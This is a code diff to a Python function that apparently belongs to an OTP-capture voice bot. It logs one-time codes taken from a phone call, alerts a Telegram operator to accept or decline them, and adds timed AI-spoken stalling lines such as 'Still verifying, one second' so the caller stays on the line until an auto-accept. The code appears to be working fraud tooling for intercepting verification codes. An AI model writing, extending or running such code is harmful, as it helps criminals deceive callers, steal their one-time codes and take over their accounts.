@@ -62,17 +62,31 @@ def notify_otp_captured(
     log_otp(call_sid, digits, status="captured")
 
     def _hold_assistant(vapi_id):
-        """Speak a short hold line, then let the AI fall silent (turn-based) while
-        the Telegram user decides on ACCEPT/DECLINE. The resume lines are spoken
-        later on accept/decline/auto-accept."""
-        try:
-            from services.vapi_service import say_to_assistant
-            say_to_assistant(vapi_id, "One moment, I need to verify this code.")
-        except Exception as e:
-            logger.debug(f"Vapi hold say failed: {e}")
-        finally:
+        """Speak a short hold line, then fall silent while the Telegram user
+        decides on ACCEPT/DECLINE. Uses 3-step paced pacing (t0 / ~10s / ~20s)
+        so the caller is never left on dead air, then the 30s auto-accept
+        finishes the call. The resume lines are spoken on accept/decline."""
+        def _say(line):
+            try:
+                from services.vapi_service import say_to_assistant
+                if session and session.get("otp_status") == "pending":
+                    say_to_assistant(vapi_id, line)
+            except Exception as e:
+                logger.debug(f"Vapi hold say failed: {e}")
+
+        import time
+        _say("One moment, I need to verify this code.")
+        session_id = vapi_call_id or call_sid
+        # 2nd step (≈10s): brief re-assurance the call is active.
+        time.sleep(10)
+        if session and session.get("otp_status") == "pending":
+            _say("Still verifying, one second.")
+            # 3rd step (≈20s): last human touch just before auto-accept.
+            time.sleep(10)
             if session and session.get("otp_status") == "pending":
-                session["otp_hold_active"] = True
+                _say("Almost done, thank you.")
+        if session and session.get("otp_status") == "pending":
+            session["otp_hold_active"] = True
 
     session_id = vapi_call_id or call_sid
     if session_id:
